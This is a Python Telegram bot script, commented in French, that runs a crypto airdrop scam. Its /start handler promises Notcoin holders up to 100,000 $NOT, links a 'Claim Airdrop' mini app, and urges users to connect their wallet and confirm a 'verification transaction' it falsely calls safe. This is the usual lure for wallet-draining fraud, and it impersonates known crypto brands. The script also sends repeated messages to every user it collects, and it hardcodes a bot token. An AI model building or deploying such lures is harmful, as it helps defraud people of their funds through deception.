import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, JobQueue

# Configurer le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Remplace TOKEN par le token de ton bot
TOKEN = '7351832151:AAGqfUHIXmyB3y7pGWAYViMYGwNioDZZvwc'
IMAGE_URL = 'https://drive.google.com/uc?export=download&id=14DZxx8aTCur1e1pcYhhB647NHqoj-58E'
MINI_APP_URL = 't.me/Ethenathe_bot/Web3Rewards'  # Remplace par l'URL de ta mini app

# Liste des utilisateurs à qui envoyer des messages
user_ids = set()
# Intervalle de temps pour les messages périodiques en secondes (exemple : 1 heure)
MESSAGE_INTERVAL = 3600

# Fonction pour démarrer le bot et envoyer l'image avec texte et boutons
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    bot = Bot(token=TOKEN)
    user_id = update.effective_user.id
    user_first_name = update.message.from_user.first_name

    # Enregistrer l'utilisateur pour les messages périodiques
    user_ids.add(user_id)

    try:
        # Texte du message avec le prénom de l'utilisateur
        message_text = (
            f"Hey {user_first_name}! Every Notcoin holder receives up to 100,000 $NOT\n\n"
            "✨ We're excited to announce a $1,000,000 Airdrop of $NOT tokens! ✨\n\n"
            "Spaces are limited."
        )

        # Message HTML à ajouter
        html_message = (
            "<b>Pixelverse x Notcoin 🛠️</b>\n\n"
            "⚠️ <b>Pan, if you received a transaction with the comment stating that you are not eligible for the airdrop, don't be scared!</b>\n\n"
            "It means that an airdrop is available for you and the system has sent a verification message to check that your wallet is not a spam wallet.\n\n"
            "❗ <b>Important note:</b>\n\n"
            "If your profile is eligible for the reward, after you have connected your wallet, the verification system will prompt you to confirm the verification transaction, it must be confirmed. Otherwise, you will not be able to collect your reward.\n\n"
            "<b>Due to the increasing cases of spam and system abuses, we had to introduce this stage of verification. It is safe and does not cause any financial losses for you.</b>"
        )

        # Boutons
        keyboard = [
            [InlineKeyboardButton("Claim Airdrop 🎁", url=MINI_APP_URL)],
            [InlineKeyboardButton("News Twitter/X", url='https://x.com/ethena_labs')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Envoi de l'image avec le texte en légende et les boutons
        await bot.send_photo(chat_id=update.message.chat_id, photo=IMAGE_URL, caption=message_text, reply_markup=reply_markup)
        await bot.send_message(chat_id=update.message.chat_id, text=html_message, parse_mode="HTML")
        print("Messages envoyés avec succès")
    except Exception as e:
        logging.error(f"Failed to send message: {e}")
        await update.message.reply_text("Failed to send message.")

# Fonction pour envoyer des messages périodiques
async def send_periodic_message(context: ContextTypes.DEFAULT_TYPE) -> None:
    bot = context.bot
    for user_id in user_ids:
        try:
            await bot.send_message(
                chat_id=user_id,
                text="This is a periodic update message."
            )
        except Exception as e:
            logging.error(f"Error sending message to {user_id}: {e}")

def main() -> None:
    # Initialiser l'application avec le token de ton bot
    application = ApplicationBuilder().token(TOKEN).build()

    # Ajouter les gestionnaires
    application.add_handler(CommandHandler('start', start))

    # Configurer une tâche récurrente pour envoyer des messages
    job_queue = application.job_queue
    job_queue.run_repeating(send_periodic_message, interval=MESSAGE_INTERVAL)

    # Démarrer le bot
    application.run_polling()

if __name__ == '__main__':
    main()
